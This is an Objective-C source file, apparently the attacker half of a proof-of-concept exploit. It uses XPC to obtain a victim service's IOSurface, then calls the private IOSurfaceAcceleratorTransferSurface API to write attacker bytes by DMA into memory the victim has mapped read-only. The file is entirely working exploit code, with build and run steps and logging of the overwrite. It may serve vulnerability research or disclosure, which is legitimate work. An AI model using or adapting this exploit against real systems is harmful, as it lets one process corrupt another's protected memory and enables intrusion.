// attacker.m - DART DMA Cross-Process PoC (attacker side)
//
// Connects to victim XPC service. Receives victim's IOSurface mach port.
// Looks up the surface. Creates its own source IOSurface filled with 0x41.
// Calls IOSurfaceAcceleratorTransferSurface to DMA from attacker src to
// victim dst. Victim has VM_PROT_READ on its mapping and a live Metal
// ShaderRead texture bound to it.
//
// Build:
//   clang -fobjc-arc -framework Foundation -framework IOSurface \
//         -o attacker attacker.m
//
// Run: ./attacker

#import <Foundation/Foundation.h>
#import <IOSurface/IOSurface.h>
#import <IOSurface/IOSurfaceRef.h>
#import <xpc/xpc.h>
#import <mach/mach.h>
#import <dlfcn.h>

#define SURF_W 64
#define SURF_H 64
#define MACH_SERVICE_NAME "lol.apple.dart-victim"

// Private API from IOSurfaceAccelerator.
typedef void *IOSurfaceAcceleratorRef;
extern kern_return_t IOSurfaceAcceleratorCreate(CFAllocatorRef alloc,
                                                uint32_t type,
                                                IOSurfaceAcceleratorRef *out);
extern kern_return_t IOSurfaceAcceleratorTransferSurface(IOSurfaceAcceleratorRef acc,
                                                         IOSurfaceRef src,
                                                         IOSurfaceRef dst,
                                                         CFDictionaryRef options,
                                                         void *reserved1,
                                                         void *reserved2,
                                                         void *reserved3,
                                                         void *reserved4);

static IOSurfaceRef create_attacker_surface(uint32_t fill) {
    NSDictionary *props = @{
        (__bridge NSString *)kIOSurfaceWidth: @(SURF_W),
        (__bridge NSString *)kIOSurfaceHeight: @(SURF_H),
        (__bridge NSString *)kIOSurfaceBytesPerElement: @(4),
        (__bridge NSString *)kIOSurfacePixelFormat: @((uint32_t)'BGRA'),
    };
    IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)props);
    if (!s) return NULL;
    IOSurfaceLock(s, 0, NULL);
    uint32_t *base = (uint32_t *)IOSurfaceGetBaseAddress(s);
    size_t bpr = IOSurfaceGetBytesPerRow(s);
    for (int y = 0; y < SURF_H; y++) {
        uint32_t *row = (uint32_t *)((uint8_t *)base + y * bpr);
        for (int x = 0; x < SURF_W; x++) row[x] = fill;
    }
    IOSurfaceUnlock(s, 0, NULL);
    return s;
}

int main(int argc, char **argv) {
    @autoreleasepool {
        fprintf(stderr, "[attacker] pid=%d starting\n", getpid());

        xpc_connection_t c = xpc_connection_create_mach_service(
            MACH_SERVICE_NAME, NULL, 0);
        if (!c) { fprintf(stderr, "[attacker] xpc connect failed\n"); return 1; }

        xpc_connection_set_event_handler(c, ^(xpc_object_t ev) {
            xpc_type_t t = xpc_get_type(ev);
            if (t == XPC_TYPE_ERROR) {
                const char *d = xpc_dictionary_get_string(ev, XPC_ERROR_KEY_DESCRIPTION);
                fprintf(stderr, "[attacker] XPC error: %s\n", d ? d : "?");
            }
        });
        xpc_connection_resume(c);

        xpc_object_t req = xpc_dictionary_create(NULL, NULL, 0);
        xpc_dictionary_set_string(req, "op", "get_surface");

        fprintf(stderr, "[attacker] requesting victim IOSurface via XPC...\n");
        xpc_object_t reply = xpc_connection_send_message_with_reply_sync(c, req);
        if (xpc_get_type(reply) != XPC_TYPE_DICTIONARY) {
            fprintf(stderr, "[attacker] bad reply type\n"); return 1;
        }
        mach_port_t surf_port = xpc_dictionary_copy_mach_send(reply, "surface_port");
        if (!MACH_PORT_VALID(surf_port)) {
            fprintf(stderr, "[attacker] invalid surface port\n"); return 1;
        }
        fprintf(stderr, "[attacker] got surface mach port 0x%x\n", surf_port);

        IOSurfaceRef victim = IOSurfaceLookupFromMachPort(surf_port);
        if (!victim) {
            fprintf(stderr, "[attacker] IOSurfaceLookupFromMachPort failed\n");
            return 1;
        }
        fprintf(stderr, "[attacker] looked up victim IOSurface: %zux%zu\n",
                IOSurfaceGetWidth(victim), IOSurfaceGetHeight(victim));

        IOSurfaceRef src = create_attacker_surface(0x41414141);
        if (!src) { fprintf(stderr, "[attacker] src surface create failed\n"); return 1; }
        fprintf(stderr, "[attacker] created source IOSurface filled 0x41414141\n");

        IOSurfaceAcceleratorRef acc = NULL;
        kern_return_t kr = IOSurfaceAcceleratorCreate(NULL, 0, &acc);
        if (kr != KERN_SUCCESS || !acc) {
            fprintf(stderr, "[attacker] IOSurfaceAcceleratorCreate kr=0x%x\n", kr);
            return 1;
        }

        fprintf(stderr, "[attacker] calling IOSurfaceAcceleratorTransferSurface...\n");
        kr = IOSurfaceAcceleratorTransferSurface(acc, src, victim, NULL,
                                                 NULL, NULL, NULL, NULL);
        fprintf(stderr, "[attacker] transfer kr=0x%x %s\n", kr,
                kr == 0 ? "(DMA submitted)" : "(failed)");

        // Small delay so the DMA completes before attacker exits and so we
        // give the victim a chance to observe several post-attack iterations.
        sleep(2);

        // Optionally inspect victim surface contents from attacker side.
        IOSurfaceLock(victim, kIOSurfaceLockReadOnly, NULL);
        uint32_t *vp = (uint32_t *)IOSurfaceGetBaseAddress(victim);
        fprintf(stderr, "[attacker] post-DMA victim[0] = 0x%08x\n", vp[0]);
        IOSurfaceUnlock(victim, kIOSurfaceLockReadOnly, NULL);

        fprintf(stderr, "[attacker] done\n");
    }
    return 0;
}
